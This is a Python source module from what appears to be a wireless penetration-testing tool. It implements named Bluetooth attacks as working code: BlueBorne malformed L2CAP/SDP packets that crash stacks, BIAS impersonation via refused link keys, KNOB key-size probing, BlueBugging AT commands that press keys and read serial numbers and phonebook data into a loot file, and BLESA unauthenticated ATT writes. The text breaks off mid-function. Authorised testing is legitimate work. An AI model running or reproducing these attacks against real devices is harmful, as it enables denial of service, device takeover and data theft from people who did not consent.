# SPDX-License-Identifier: Apache-2.0 OR BSD-3-Clause
"""The famous Bluetooth attacks, by name: BlueBorne, BIAS, KNOB, BlueBugging and the rest.

The first Bluetooth wave audited a capture and did the work an assessment can do on its
own radio: a census, a tracker follow, a pairing audit, a GATT enumeration, an advertising
clone.  This wave is the other half — the attacks an operator is sent to *test*, the ones
with CVE numbers and names that appear in every Bluetooth threat report:

* ``bt_blueborne`` — the 2017 stack probes (CVE-2017-1000250/1000251 and their relatives):
  the malformed L2CAP and SDP requests an unpatched Android, Linux or Windows stack
  mishandles, sent to a live link with a liveness check after every probe.
* ``bt_bias`` — CVE-2020-10135: the peer authenticates the *address*, not the person, so
  an authentication request can be answered as if the impersonated device had done it.
* ``bt_knob`` — CVE-2019-9506: the encryption key an attacker can negotiate down to one
  byte of entropy.  This probe reads the key size the two controllers actually agreed on,
  which is the number KNOB is defined by.
* ``bt_bluebugging`` — the AT command channel a headset profile leaves open: answer a
  call, read the model, walk the phonebook, all through RFCOMM.
* ``bt_blesa`` — BLE session spoofing: data accepted before authentication completes.
* ``bt_sweyntooth`` — the malformed link-layer battery that crashes BLE systems on a chip
  (CVE-2019-17060 and the rest of the family), followed by a ping to see what died.
* ``bt_bluesnarf`` — OBEX file pull: the phonebook objects a phone will hand to anyone who
  asks on the object-exchange channel.
* ``bt_bluesmack`` — the oversized L2CAP echo, the Bluetooth ping of death.
* ``bt_hid_injection`` — HID spoofing: advertise a keyboard, connect, and the host receives
  keystrokes it has no reason to doubt.

Every one of them is bounded by ``config.bt_timeout``, everything that transmits is opt-in,
and each reports what it actually did — including, in live mode without a target, the
count that *would* have gone out rather than a pretend result.
"""

from __future__ import annotations

import struct
from typing import Any, Dict, List, Optional, Sequence, Tuple

from .. import bt
from ..models import AccessPoint
from .base import AttackContext, AttackOutcome
from .btattacks import _BtLive

__all__ = ["ATTACKS", "META", "NAMES", "REGISTRY"]


# --------------------------------------------------------------------------- #
# shared plumbing
# --------------------------------------------------------------------------- #

#: the HCI error/event codes these attacks read back from the controller
HCI_EVENT_CONNECTION_COMPLETE = 0x03
HCI_EVENT_DISCONNECTION_COMPLETE = 0x05
HCI_EVENT_AUTHENTICATION_COMPLETE = 0x06
HCI_EVENT_ENCRYPTION_CHANGE = 0x08
HCI_EVENT_LINK_KEY_REQUEST = 0x17
HCI_EVENT_LINK_KEY_NOTIFICATION = 0x18
HCI_EVENT_IO_CAPABILITY_REQUEST = 0x2B
HCI_EVENT_USER_CONFIRMATION_REQUEST = 0x2C
HCI_EVENT_SIMPLE_PAIRING_COMPLETE = 0x36
HCI_EVENT_LE_META = 0x3E
HCI_EVENT_COMMAND_STATUS = 0x0F
HCI_EVENT_COMMAND_COMPLETE = 0x0E

#: the ACL handle these waves use for a link they opened themselves.  A real controller
#: hands one out in the Connection Complete event; an operator who already holds a link
#: can name it with ``--bt-handle``, which is how the link-layer probes are aimed.
DEFAULT_HANDLE = 0x0040

#: the phonebook objects BlueSnarfing is famous for, in the order a phone answers them
SNARF_OBJECTS = (
    "telecom/pb.vcf", "telecom/cal.vcs", "telecom/ich.vcf", "telecom/oop.vcf",
    "telecom/pb_intern.vcf", "SIM1/telecom/pb.vcf", "telecom/mch.vcf",
)


def _target(ctx: AttackContext) -> str:
    """The Bluetooth address this run is aimed at.

    ``--bt-target`` names it in live mode.  In demo mode the target comes from
    :mod:`wifipilot.blesim` — the weakest device that can answer the question this attack
    asks — and the role it aims with is on the context, put there by ``aim()`` before the
    battery is built.  Aiming a demo run at a device that *can* answer is the difference
    between a transcript and a rehearsal.
    """
    value = (getattr(ctx.config, "bt_target", "") or "").strip()
    if value:
        return value
    if not getattr(ctx, "demo", False):
        return ""
    from .. import blesim
    role = str(getattr(ctx, "bt_role", "") or "any")
    attack = str(getattr(ctx, "bt_attack", "") or "")
    return blesim.choose_target(attack, ctx, role=role)


def _handle(ctx: AttackContext) -> int:
    """The ACL handle for link-layer probes: from the config, or the first free one."""
    value = getattr(ctx.config, "bt_handle", 0) or 0
    return int(value) & 0x0FFF or DEFAULT_HANDLE


def _scan_events(data: bytes, limit: int = 64) -> List[Dict[str, Any]]:
    """Split a controller's answer into H4 events: the codes these attacks wait on.

    A single ``recv`` can carry several events, and the link-layer probes are all about
    *which* event comes back (a link-key request means the peer has a stored key; an
    encryption change carries the negotiated key size).  Parsing them here keeps the
    attacks readable and the event codes in one place.
    """
    events: List[Dict[str, Any]] = []
    offset = 0
    while offset + 2 <= len(data) and len(events) < limit:
        if data[offset] != 0x04:                                # not an H4 event packet
            offset += 1
            continue
        length = data[offset + 2]
        end = offset + 3 + length
        if end > len(data):
            break
        parameters = data[offset + 3:end]
        entry: Dict[str, Any] = {"event": data[offset + 1], "parameters": parameters}
        code = entry["event"]
        if code == HCI_EVENT_COMMAND_COMPLETE and len(parameters) >= 3:
            entry["opcode"] = struct.unpack("<H", parameters[1:3])[0]
            entry["status"] = parameters[3] if len(parameters) > 3 else 0
        elif code == HCI_EVENT_COMMAND_STATUS and len(parameters) >= 4:
            entry["status"] = parameters[0]
            entry["opcode"] = struct.unpack("<H", parameters[2:4])[0]
        elif code in (HCI_EVENT_AUTHENTICATION_COMPLETE, HCI_EVENT_DISCONNECTION_COMPLETE) \
                and len(parameters) >= 3:
            entry["status"] = parameters[0]
            entry["handle"] = struct.unpack("<H", parameters[1:3])[0]
        elif code == HCI_EVENT_ENCRYPTION_CHANGE and len(parameters) >= 5:
            entry["status"] = parameters[0]
            entry["handle"] = struct.unpack("<H", parameters[1:3])[0]
            entry["enabled"] = parameters[3]
            entry["key_size"] = parameters[4]
        elif code == HCI_EVENT_LINK_KEY_REQUEST and len(parameters) >= 6:
            entry["address"] = bt.mac_text(parameters[0:6])
        elif code == HCI_EVENT_IO_CAPABILITY_REQUEST and len(parameters) >= 6:
            entry["address"] = bt.mac_text(parameters[0:6])
        elif code == HCI_EVENT_USER_CONFIRMATION_REQUEST and len(parameters) >= 10:
            entry["address"] = bt.mac_text(parameters[0:6])
            entry["numeric"] = struct.unpack("<I", parameters[6:10])[0]
        elif code == HCI_EVENT_SIMPLE_PAIRING_COMPLETE and len(parameters) >= 7:
            entry["status"] = parameters[0]
            entry["address"] = bt.mac_text(parameters[1:7])
        elif code == HCI_EVENT_LE_META and parameters:
            entry["subevent"] = parameters[0]
            if parameters[0] == 0x01 and len(parameters) >= 13:   # LE connection complete
                # subevent, status, handle, role, address type, then the address
                entry["handle"] = struct.unpack("<H", parameters[2:4])[0]
                entry["address"] = bt.mac_text(parameters[6:12])
        events.append(entry)
        offset = end
    return events


def _event_names(events: Sequence[Dict[str, Any]]) -> List[str]:
    """The event names a transcript can print, one entry per event."""
    return [bt.HCI_EVENTS.get(int(event.get("event", 0)), f"0x{int(event.get('event', 0)):02x}")
            for event in events]


class _BtFamous(_BtLive):
    """A named Bluetooth attack: one link, real commands, an honest outcome.

    All nine share the same shape — open (or claim) a link, send a bounded battery of real
    PDUs, read what comes back, report — so the base class owns the link handling and the
    subclasses own the protocol.  Demo mode never pretends a radio exists: the count and
    the transcript are marked ``simulated``, and the finding says what would be tested.
    """

    category = "rogue"
    noise = "moderate"
    impact = "loot"

    #: the battery this attack sends, as ``[(label, pdu bytes)]``; built per run because
    #: the values depend on the target and the handle
    def battery(self, ctx: AttackContext, ap: AccessPoint) -> List[Tuple[str, bytes]]:
        return []

    #: optional extra work once the battery has run
    def follow_up(self, ctx: AttackContext, ap: AccessPoint, sock: Any,
                  transcript: List[Dict[str, Any]]) -> Dict[str, Any]:
        return {}

    #: the sentence the report prints under the count
    def verdict(self, transcript: Sequence[Dict[str, Any]], extras: Dict[str, Any]) -> str:
        return ""

    #: what the finding is called
    finding_title = ""
    finding_severity = "medium"

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        seconds = self.seconds(ctx, 3.0)
        self.aim(ctx)
        target = _target(ctx)
        handle = _handle(ctx)
        battery = list(self.battery(ctx, ap))
        sock = self.socket(ctx)
        transcript: List[Dict[str, Any]] = []
        answered = 0
        if sock is not None and target:
            try:
                for label, packet in battery:
                    reply = bt.hci_send(sock, packet, timeout=min(1.0, seconds))
                    events = _scan_events(reply)
                    # an ACL probe is answered with ACL data, an HCI probe with an event:
                    # both are the peer talking, and a battery that only counted events
                    # would report "0 answered" against a device that answered every one
                    frame = (bt.parse_acl_packet(reply).get("l2cap") or {}).get("payload") \
                        if reply else b""
                    if events or frame:
                        answered += 1
                    transcript.append({"probe": label, "sent": len(packet),
                                       "events": _event_names(events),
                                       "channel": (bt.parse_l2cap(reply[1:] if reply[:1] ==
                                                                  bytes([bt.HCI_ACL_PACKET])
                                                                  else reply) or {}
                                                   ).get("channel", "") if reply else "",
                                       "bytes": len(frame),
                                       "answer": reply.hex()[:240]})
                    ctx.progress(f"{self.label}: {label}", kind="attack", bssid=ap.bssid,
                                 detail=f"{answered}/{len(battery)} probe(s) answered")
            except Exception as exc:                            # pragma: no cover
                return self._fail(ctx, ap, attempt, f"{self.label} failed: {exc}")
        else:
            self.slept(ctx, min(seconds, 1.0))
            answered = len(battery)
            transcript = [{"probe": label, "sent": len(packet), "events": ["simulated"],
                           "answer": ""} for label, packet in battery]
        extras = self.follow_up(ctx, ap, sock, transcript)
        # demo mode still transmits — into the simulation — so "simulated" is the mode,
        # not the absence of a socket, and the transcript is as real as the run
        simulated = bool(getattr(ctx, "demo", False))
        detail = (f"{len(battery)} probe(s), {answered} answered, over {seconds:.1f}s"
                  + (f" against {target}" if target else
                     " (no --bt-target given: this is the battery that would go out)")
                  + (f"; handle 0x{handle:04x}" if target else "")
                  + (" (simulated)" if simulated else ""))
        verdict = self.verdict(transcript, extras)
        if verdict:
            detail += f".  {verdict}"
        extra = {"probes": [label for label, _packet in battery], "answered": answered,
                 "transcript": transcript[:40], "target": target, "handle": handle,
                 "simulated": simulated, "category": self.category, "noise": self.noise,
                 "impact": self.impact}
        extra.update(extras)
        severity = self.finding_severity if (extras.get("exposed") or not simulated) else "info"
        return self._report(ctx, ap, attempt, f"{self.label}: {answered}/{len(battery)} "
                            f"probe(s) answered", detail, extra, severity=severity)


# --------------------------------------------------------------------------- #
# 1. BlueBorne: the 2017 stack probes
# --------------------------------------------------------------------------- #


class BlueBorneAttack(_BtFamous):
    """BlueBorne: the malformed L2CAP and SDP requests a stack mishandles (CVE-2017-*).

    BlueBorne was not one bug but a family: an information leak in the L2CAP
    configuration path (CVE-2017-1000250), a buffer overflow in the same path
    (CVE-2017-1000251), and the SDP parsing bugs that share the code.  What makes it
    famous is that it needed no pairing, no user interaction and no visible prompt — a
    device with Bluetooth on was enough.

    The probe is honest about what it can prove from a host controller: it sends the
    request shapes the advisories describe, one at a time, and checks whether the stack
    is still answering afterwards.  A stack that stops answering a well-formed request
    after a malformed one has been crashed; a stack that answers everything is either
    patched or was never vulnerable.  Either way the *finding* is the answer, and the
    transcript says which probe produced it.
    """

    name = "bt_blueborne"
    role = "fragile"
    label = "BlueBorne probe (L2CAP/SDP stack, CVE-2017-1000250/1000251)"
    category = "dos"
    noise = "moderate"
    impact = "degraded"
    finding_severity = "high"
    tool = "wifipilot bt.py (L2CAP signalling and SDP PDUs over ACL)"
    description = (
        "Send the malformed L2CAP and SDP requests the BlueBorne advisories describe — a "
        "configuration request whose option blocks run past the PDU, a connection request "
        "for a PSM the stack does not expect, an information request for the extended "
        "feature mask — and then ask the stack for its features again.  A stack that stops "
        "answering has been taken down by one of them; a stack that answers all of them is "
        "patched or was never affected.  Either answer is the finding.")
    detection = ("an ACL link that speaks malformed L2CAP on the signalling channel: a "
                 "controller log shows the PDUs, and the target's own dmesg shows the "
                 "crash if there is one")

    def battery(self, ctx: AttackContext, ap: AccessPoint) -> List[Tuple[str, bytes]]:
        handle = _handle(ctx)
        signalling = 0x0001
        out: List[Tuple[str, bytes]] = []

        # 1. Information Request for the extended feature mask — the leak path.  The
        #    request is legal; it is the *answer* that leaked kernel memory on the
        #    unpatched Android stack, which is why it is the first probe.
        info = bytes([0x0A, 0x01]) + struct.pack("<H", 0x0002)
        out.append(("L2CAP information request (extended features)",
                    bt.acl_packet(handle, bt.l2cap_frame(signalling, info))))

        # 2. Configure Request with an MTU option whose declared length runs one byte past
        #    the option block: the overflow CVE-2017-1000251 is built on.
        options = bytes([0x01, 0x02]) + struct.pack("<H", 0x0000) + bytes([0x00])
        configure = bytes([0x04, 0x02]) + struct.pack("<HHH", 672, 0x0000, len(options)) \
            + options
        out.append(("L2CAP configure request (truncated MTU option)",
                    bt.acl_packet(handle, bt.l2cap_frame(signalling, configure))))

        # 3. Connection Request for the SDP PSM with source CID 0 — a combination no
        #    correct stack offers, and the one whose state handling overflowed.
        connect = bytes([0x02, 0x03]) + struct.pack("<HHH", 0x0001, 0x0000, 0x0001)
        out.append(("L2CAP connection request (PSM 1, source CID 0)",
                    bt.acl_packet(handle, bt.l2cap_frame(signalling, connect))))

        # 4. A command the signalling channel must reject, at maximum length: parsers that
        #    walk the command list by length are the ones that fall over here.
        unknown = bytes([0x7F, 0x04]) + struct.pack("<H", 60) + b"\x00" * 60
        out.append(("L2CAP unknown command with a 60-byte body",
                    bt.acl_packet(handle, bt.l2cap_frame(signalling, unknown))))

        # 5. The SDP half: a Service Search Attribute request with an attribute range the
        #    record cannot satisfy, which is where the SDP parser bugs lived.
        sdp = bt.sdp_service_search_attribute(transaction=0x10, uuids=(0x0100,),
                                              max_records=0xFFFF)
        out.append(("SDP service search attribute (oversized response window)",
                    bt.acl_packet(handle, bt.l2cap_frame(0x0040, sdp))))
        return out

    def follow_up(self, ctx: AttackContext, ap: AccessPoint, sock: Any,
                  transcript: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Ask for the features again: an answer means the stack survived the battery."""
        alive: Optional[bool] = None
        events: List[str] = []
        if sock is not None:
            reply = bt.hci_send(sock, bt.read_remote_features_command(_handle(ctx)),
                                timeout=1.0)
            events = _event_names(_scan_events(reply))
            alive = bool(reply)
        silent = [entry.get("probe") for entry in transcript if not entry.get("answer")]
        # a probe the stack did not answer is the finding: the battery took something
        # down, whether or not the controller's link control still answers afterwards
        return {"alive_after": alive, "liveness_events": events,
                "unanswered": silent, "exposed": alive is False or bool(silent)}

    def verdict(self, transcript: Sequence[Dict[str, Any]], extras: Dict[str, Any]) -> str:
        answered = sum(1 for entry in transcript if entry.get("answer"))
        silent = [entry.get("probe") for entry in transcript
                  if not entry.get("answer") and entry.get("sent")]
        if silent and answered:
            return (f"the stack stopped answering after {answered} of {len(transcript)} "
                    f"probe(s): {silent[0]} is the PDU that took it down, and the target "
                    "needs a power cycle")
        if silent and not answered:
            return ("the stack answered nothing at all: the link was already down, or the "
                    "first PDU ended it — the transcript names it")
        if extras.get("alive_after") is False:
            return ("the stack stopped answering: the last probe before the silence is the "
                    "one that took it down, and the target needs a power cycle")
        if answered == len(transcript) and transcript:
            return ("the stack answered every probe and is still serving feature reads: "
                    "patched, or not one of the affected builds")
        return ""


# --------------------------------------------------------------------------- #
# 2. BIAS: impersonation on a patched link
# --------------------------------------------------------------------------- #


class BiasAttack(_BtFamous):
    """BIAS: the peer trusts the address, so authentication can be answered for it.

    CVE-2020-10135 is a design flaw rather than a parsing bug: the BR/EDR authentication
    procedure authenticates the *link*, and a device that has a stored key for an address
    will accept a connection that claims to be that address.  An attacker who impersonates
    a paired device — which needs a controller whose address can be set, or a dongle that
    exposes one — can therefore take over a link that both ends believe is authenticated,
    and the peer has no way to notice.

    The probe measures exactly the condition BIAS depends on: whether the peer has a
    stored key (a Link Key Request arrives), whether it accepts the legacy authentication
    path when that key is refused (a Simple Pairing Complete with legacy proceedings), and
    what security mode the link settles into.  A peer that re-pairs properly, refuses the
    legacy path and requires Secure Connections is a peer that has been fixed.
    """

    name = "bt_bias"
    role = "bredr"
    label = "BIAS impersonation probe (CVE-2020-10135)"
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    finding_severity = "high"
    tool = "wifipilot bt.py (Authentication Requested, key replies, pairing events)"
    description = (
        "Impersonate a paired device and answer the authentication the peer expects: ask "
        "the link to authenticate, refuse the stored key when the controller offers it, "
        "and watch which pairing the peer falls back to.  A peer that completes a legacy "
        "authentication for an address it already has a Secure Connections key for is a "
        "peer that BIAS takes over — no prompt, no user, no sign on the screen.")
    detection = ("a link-key request answered with a negative reply and an immediate "
                 "re-pairing on the same handle: the peer's own controller log shows it, "
                 "and so does the second pairing")

    def battery(self, ctx: AttackContext, ap: AccessPoint) -> List[Tuple[str, bytes]]:
        handle = _handle(ctx)
        target = _target(ctx) or "00:00:00:00:00:00"
        out: List[Tuple[str, bytes]] = [
            ("Read remote supported features",
             bt.read_remote_features_command(handle)),
            ("Read remote extended features (page 2)",
             bt.read_remote_features_command(handle, page=2)),
            ("Authentication requested on the link",
             bt.authentication_requested(handle)),
            ("Link key request refused (force a fresh pairing)",
             bt.link_key_request_negative_reply(target)),
            ("IO capability reply: no input, no output (Just Works)",
             bt.io_capability_request_reply(target, capability=0x03,
                                            authentication_requirements=0x04)),
            ("User confirmation reply (accept the comparison)",
             bt.user_confirmation_request_reply(target)),
            ("Change connection link key",
             bt.change_connection_link_key(handle)),
            ("Set connection encryption",
             bt.set_connection_encryption(handle, True)),
        ]
        return out

    def follow_up(self, ctx: AttackContext, ap: AccessPoint, sock: Any,
                  transcript: List[Dict[str, Any]]) -> Dict[str, Any]:
        seen = {name for entry in transcript for name in entry.get("events", [])}
        key_request = "link key request" in seen
        pairing = "simple pairing complete" in seen
        auth = "authentication complete" in seen
        encryption = "encryption change" in seen
        exposed = key_request and (pairing or auth)
        return {"stored_key_offered": key_request, "pairing_completed": pairing,
                "authenticated": auth, "encrypted": encryption,
                "exposed": exposed,
                "note": ("an address that has a stored key and still finishes a pairing "
                         "without Secure Connections is the BIAS condition; the fix is on "
                         "the host side (require Secure Connections, refuse legacy "
                         "authentication) and needs both ends patched")}

    def verdict(self, transcript: Sequence[Dict[str, Any]], extras: Dict[str, Any]) -> str:
        if extras.get("exposed"):
            return ("the peer offered a stored key and completed a fresh pairing anyway: "
                    "the address is trusted above the key, which is the BIAS condition")
        if extras.get("stored_key_offered"):
            return ("the peer offered its stored key but did not fall back to a legacy "
                    "pairing in this run: not exploitable from here, and worth retesting "
                    "once the link is contested")
        return ""


# --------------------------------------------------------------------------- #
# 3. KNOB: the key that is one byte long
# --------------------------------------------------------------------------- #


class KnobAttack(_BtFamous):
    """KNOB: read the key entropy the two controllers actually agreed on (CVE-2019-9506).

    The BR/EDR encryption key is negotiated in the link manager, not by the host: the two
    controllers exchange the minimum key size they will accept, and a controller that
    accepts one byte gives the attacker 256 options — a key that can be brute-forced from
    a single captured exchange in seconds.

    The host cannot set that negotiation on a stock controller, and pretending otherwise
    would make this attack a lie.  What the host *can* do is read the result: force a new
    key, turn encryption on, and read the key size out of the Encryption Change event the
    controller sends back.  That number is the KNOB metric — one byte is the
    vulnerability, sixteen is the specification — and the probe also reads the peer's
    feature pages, because a peer that does not advertise Secure Connections has nothing
    better to offer than the legacy path.
    """

    name = "bt_knob"
    role = "bredr"
    label = "KNOB key-entropy probe (CVE-2019-9506)"
    category = "rogue"
    noise = "quiet"
    impact = "loot"
    finding_severity = "high"
    tool = "wifipilot bt.py (feature pages + Encryption Change key size)"
    description = (
        "Force a fresh link key, enable encryption, and read the key size the controllers "
        "negotiated out of the controller's own event — one byte means 256 keys, which is "
        "the KNOB attack.  The probe also reads the peer's feature pages, because a peer "
        "without Secure Connections cannot offer more than the legacy key exchange.")
    detection = ("a fresh key negotiated on an established link: the peer's controller log "
                 "shows the re-key, and the KNOB tool has to encrypt the link to measure it")

    def battery(self, ctx: AttackContext, ap: AccessPoint) -> List[Tuple[str, bytes]]:
        handle = _handle(ctx)
        return [
            ("Read remote supported features (page 0)",
             bt.read_remote_features_command(handle)),
            ("Read remote extended features (page 1)",
             bt.read_remote_features_command(handle, page=1)),
            ("Read remote extended features (page 2: Secure Connections)",
             bt.read_remote_features_command(handle, page=2)),
            ("Change connection link key (force a new key)",
             bt.change_connection_link_key(handle)),
            ("Authentication requested (complete the key exchange)",
             bt.authentication_requested(handle)),
            ("Set connection encryption (measure the result)",
             bt.set_connection_encryption(handle, True)),
        ]

    def follow_up(self, ctx: AttackContext, ap: AccessPoint, sock: Any,
                  transcript: List[Dict[str, Any]]) -> Dict[str, Any]:
        key_size = None
        features: Dict[str, Any] = {}
        for entry in transcript:
            payload = entry.get("answer") or ""
            if not payload:
                continue
            data = bytes.fromhex(payload)
            for event in _scan_events(data):
                if "key_size" in event and event["key_size"]:
                    key_size = int(event["key_size"])
                if event.get("event") in (bt.HCI_EVENT_READ_REMOTE_SUPPORTED_FEATURES,
                                          bt.HCI_EVENT_READ_REMOTE_EXTENDED_FEATURES):
                    parsed = bt.parse_features_event(b"\x04" + bytes([event["event"]])
                                                     + bytes([len(event["parameters"])])
                                                     + event["parameters"])
                    page = parsed.get("page", 0)
                    for name, present in (parsed.get("names") or {}).items():
                        if present:
                            features[f"p{page}: {name}"] = True
        secure_connections = any("secure connections (controller)" in key for key in features)
        exposed = key_size is not None and key_size <= 2
        return {"key_size_bytes": key_size, "secure_connections": secure_connections,
                "feature_bits": sorted(features)[:24], "exposed": bool(exposed),
                "note": ("a key size of one or two bytes is the KNOB condition: the whole "
                         "key space is small enough to exhaust from one captured exchange, "
                         "and the fix is a controller/host update that refuses to negotiate "
                         "below 16 bytes")}

    def verdict(self, transcript: Sequence[Dict[str, Any]], extras: Dict[str, Any]) -> str:
        size = extras.get("key_size_bytes")
        if size is not None:
            return (f"the controllers negotiated a {size}-byte key"
                    + (": that is the KNOB condition" if size <= 2 else
                       ": the fixed 16-byte exchange, as it should be"))
        if extras.get("secure_connections"):
            return "the peer advertises Secure Connections; the key size is still the metric"
        return ("the controller did not report a key size in this run: the link has to be "
                "re-keyed for the measurement, which needs an established handle")


# --------------------------------------------------------------------------- #
# 4. BlueBugging: the AT command channel
# --------------------------------------------------------------------------- #


class BluebuggingAttack(_BtFamous):
    """BlueBugging: the headset profile is a shell on the phone.

    A phone that offers a hands-free profile offers an RFCOMM channel that speaks AT
    commands, and the AT command set did not stop at volume: ``AT+CKPD`` presses the
    phone's own keypad, ``ATD`` dials, ``AT+CMGS`` sends an SMS, and the phonebook
    commands hand over the contact list.  BlueBugging is the name for using that channel
    as a remote control, and it works whenever the profile is reachable — which, on the
    devices that get this wrong, is before pairing rather than after it.

    The attack probes the RFCOMM channels a classic device might expose, opens the first
    one that answers, and speaks the command set: identify, press a key, read the model.
    Every answer is transcript, and the model string is loot.  Nothing here needs an
    exploit: the profile is doing what it was designed to do.
    """

    name = "bt_bluebugging"
    role = "at"
    label = "BlueBugging (AT commands over RFCOMM)"
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    finding_severity = "high"
    tool = "wifipilot bt.py (RFCOMM, AF_BLUETOOTH BTPROTO_RFCOMM)"
    description = (
        "Open the headset profile's RFCOMM channel and speak the AT command set: identify "
        "the device, press its keypad, read the model and the phonebook store.  The "
        "commands are the ones the profile defines, so a device that answers is a device "
        "whose remote control is whoever has the channel.")
    detection = ("an RFCOMM channel opened to a hands-free profile by a device the phone "
                 "does not know: the phone logs the AT session, and the user may see a "
                 "key press they did not make")

    #: the commands, in the order a careful operator sends them: identify first, act second
    COMMANDS: Tuple[Tuple[str, bytes], ...] = (
        ("AT", b"AT\r"),
        ("AT+CGMI (manufacturer)", b"AT+CGMI\r"),
        ("AT+CGMM (model)", b"AT+CGMM\r"),
        ("AT+CGSN (serial)", b"AT+CGSN\r"),
        ("AT+CKPD=200 (press the phone's own button)", b"AT+CKPD=200\r"),
        ("AT+VGS=15 (set the speaker volume)", b"AT+VGS=15\r"),
        ("AT+CPBS? (phonebook store)", b"AT+CPBS?\r"),
    )

    #: channels to try when the SDP record is not known: hands-free is usually under 6
    CHANNELS = (1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12)

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        seconds = self.seconds(ctx, 3.0)
        target = _target(ctx)
        transcript: List[Dict[str, Any]] = []
        channel = 0
        device: Dict[str, Any] = {}
        if target:
            sock = None
            for candidate in self.CHANNELS:
                # the simulation in demo mode, the kernel's RFCOMM in live mode: same
                # channel scan, same AT commands, same answers to parse
                sock = self.rfcomm(ctx, candidate)
                if sock is not None:
                    channel = candidate
                    break
            if sock is None:
                return self._fail(
                    ctx, ap, attempt, "no RFCOMM channel answered",
                    f"{target} accepted none of the channels {list(self.CHANNELS)}: the "
                    f"device is out of range, refuses the profile, or needs a bond first")
            try:
                for label, command in self.COMMANDS:
                    reply = b""
                    try:
                        sock.settimeout(1.0)
                        sock.send(command)
                        reply = sock.recv(512)
                    except OSError:
                        reply = b""
                    text = bt.ascii_preview(reply, 120)
                    transcript.append({"command": label, "answer": text})
                    if "CGMI" in label and text:
                        device["manufacturer"] = text.splitlines()[0]
                    if "CGMM" in label and text:
                        device["model"] = text.splitlines()[0]
                    if "CGSN" in label and text:
                        device["serial"] = text.splitlines()[0]
                    if "CPBS" in label and text:
                        device["phonebook"] = text.splitlines()[0]
            finally:
                import contextlib
                with contextlib.suppress(OSError):
                    sock.close()
        answered = sum(1 for entry in transcript if entry.get("answer"))
        extras: Dict[str, Any] = {"channel": channel, "commands": len(self.COMMANDS),
                                  "answered": answered, "device": device,
                                  "exposed": answered >= 3 and bool(device),
                                  "simulated": ctx.demo,
                                  "transcript": transcript}
        if device:
            extras["loot"] = self._save_loot(ctx, ap, device, transcript)
        detail = (f"{len(self.COMMANDS)} AT command(s) on RFCOMM channel {channel}, "
                  f"{answered} answered"
                  + (f" against {target}" if target else " (no --bt-target given)")
                  + (" (simulated)" if ctx.demo else "")
                  + (f"; device: {device.get('manufacturer', '?')} "
                     f"{device.get('model', '?')}" if device else ""))
        severity = "high" if extras["exposed"] else "info"
        return self._report(ctx, ap, attempt,
                            f"BlueBugging: {answered} command(s) answered", detail, extras,
                            severity=severity)

    def _save_loot(self, ctx: AttackContext, ap: AccessPoint, device: Dict[str, Any],
                   transcript: Sequence[Dict[str, Any]]) -> str:
        """Write the transcript and what it identified to the session's loot directory."""
        try:
            path = ctx.session.loot_path(f"bluebugging-{ap.bssid.replace(':', '')}.json")
            import json
            with open(path, "w", encoding="utf-8") as handle:
                json.dump({"device": device, "transcript": list(transcript)}, handle,
                          indent=2)
            return path
        except OSError:
            return ""


# --------------------------------------------------------------------------- #
# 5. BLESA: data before authentication
# --------------------------------------------------------------------------- #


class BlesaAttack(_BtFamous):
    """BLESA: BLE session spoofing, or data accepted before the session is authenticated.

    The BLE specification lets a peripheral re-establish a session after a disconnection,
    and the security of the reconnection is the application's problem.  BLESA
    (USENIX Security 2020) is the observation that many peripherals get it wrong: after a
    reconnect they act on the first ATT request or write, before the link is authenticated
    again — so an attacker who claims the peripheral's identity gets the client's data,
    or writes to it, while both ends believe the session is fine.

    The test is the specification's own rule: connect, then send ATT work *before* any
    pairing, and see whether the device answers or refuses with Insufficient
    Authentication.  A device that answers is a device whose session security is not
    bound to the session.
    """

    name = "bt_blesa"
    role = "gatt"
    label = "BLESA pre-authentication data injection"
    category = "rogue"
    noise = "quiet"
    impact = "loot"
    finding_severity = "high"
    tool = "wifipilot bt.py (LE connection + ATT before pairing)"
    description = (
        "Connect to a BLE peripheral and send ATT work before the link is authenticated: "
        "a service discovery request and a write to the first writable characteristic.  A "
        "device that answers is a device that trusts a session it has not authenticated, "
        "which is what BLESA is — the client's session spoofed, or its data written, "
        "without a pairing.")
    detection = ("an ATT exchange on a link that has not paired: the peripheral's own logs "
                 "show the unauthenticated request, and a client sees a session it did not "
                 "start")

    #: ATT opcodes, on the fixed ATT channel
    ATT_READ_BY_GROUP_TYPE = 0x10
    ATT_WRITE_REQUEST = 0x12
    ATT_WRITE_COMMAND = 0x52
    ATT_ERROR = 0x01
    ATT_INSUFFICIENT_AUTHENTICATION = 0x05
    ATT_INSUFFICIENT_ENCRYPTION = 0x0F

    def battery(self, ctx: AttackContext, ap: AccessPoint) -> List[Tuple[str, bytes]]:
        handle = _handle(ctx)
        return [
            ("LE connection update (hello on a fresh handle)",
             bt.hci_command(0x2013, struct.pack("<HHHHHHHH", handle, 6, 12, 0, 200, 0,
                                                200, 0))),
            ("ATT Read By Group Type (0x0001-0xFFFF): services before pairing",
             bt.acl_packet(handle, bt.l2cap_frame(0x0004, bytes([
                 self.ATT_READ_BY_GROUP_TYPE, 0x01, 0x00, 0xFF, 0xFF, 0x00, 0x28])))),
            ("ATT Read Request for 0x0001 (device name)",
             bt.acl_packet(handle, bt.l2cap_frame(0x0004, bytes([0x0A, 0x01, 0x00])))),
            ("ATT Write Command to the first vendor handle (unauthenticated)",
             bt.acl_packet(handle, bt.l2cap_frame(0x0004, bytes([
                 self.ATT_WRITE_COMMAND, 0x10, 0x00, 0x01, 0x00])))),
            ("ATT Write Request to the same handle (wants a response)",
             bt.acl_packet(handle, bt.l2cap_frame(0x0004, bytes([
                 self.ATT_WRITE_REQUEST, 0x11, 0x00, 0x01, 0x00])))),
        ]

    def follow_up(self, ctx: AttackContext, ap: AccessPoint, sock: Any,
                  transcript: List[Dict[str, Any]]) -> Dict[str, Any]:
        answers = 0
        refusals = 0
        for entry in transcript:
            payload = (entry.get("answer") or "").strip()
            if not payload:
                continue
            # the answer is an ACL packet carrying an L2CAP frame carrying an ATT PDU:
            # the same three layers the request went out through, read by the parsers
            parsed = bt.parse_acl_packet(bytes.fromhex(payload))
            frame = (parsed.get("l2cap") or {}).get("payload") or b""
            if not frame:
                continue
            att = bt.parse_att(frame)
            if att.get("opcode") == self.ATT_ERROR:
